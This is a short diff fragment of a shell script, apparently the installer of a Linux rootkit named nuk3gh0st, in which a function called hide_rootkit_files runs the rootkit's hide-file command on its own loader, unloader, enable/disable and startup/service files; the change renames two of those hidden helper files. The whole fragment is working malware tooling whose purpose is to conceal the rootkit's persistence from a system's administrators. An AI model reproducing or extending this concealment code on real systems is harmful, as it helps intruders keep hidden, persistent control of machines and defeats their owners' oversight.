@@ -118,10 +118,10 @@ function hide_rootkit_files {
         nuk3gh0st --hide-file=load-nuk3gh0st
         echo -e "   ${purple} cmd: nuk3gh0st --hide-file=unload-nuk3gh0st${endColor}"
         nuk3gh0st --hide-file=unload-nuk3gh0st
-        echo -e "   ${purple} cmd: nuk3gh0st --hide-file=startup-nuk3gh0st${endColor}"
-        nuk3gh0st --hide-file=startup-nuk3gh0st
-        echo -e "   ${purple} cmd: nuk3gh0st --hide-file=rmstartup-nuk3gh0st${endColor}"
-        nuk3gh0st --hide-file=rmstartup-nuk3gh0st
+        echo -e "   ${purple} cmd: nuk3gh0st --hide-file=enable-nuk3gh0st${endColor}"
+        nuk3gh0st --hide-file=enable-nuk3gh0st
+        echo -e "   ${purple} cmd: nuk3gh0st --hide-file=disable-nuk3gh0st${endColor}"
+        nuk3gh0st --hide-file=disable-nuk3gh0st
         echo -e "   ${purple} cmd: nuk3gh0st --hide-file=nuk3gh0st.startup${endColor}"
         nuk3gh0st --hide-file=nuk3gh0st.startup
         echo -e "   ${purple} cmd: nuk3gh0st --hide-file=nuk3gh0st.service${endColor}"
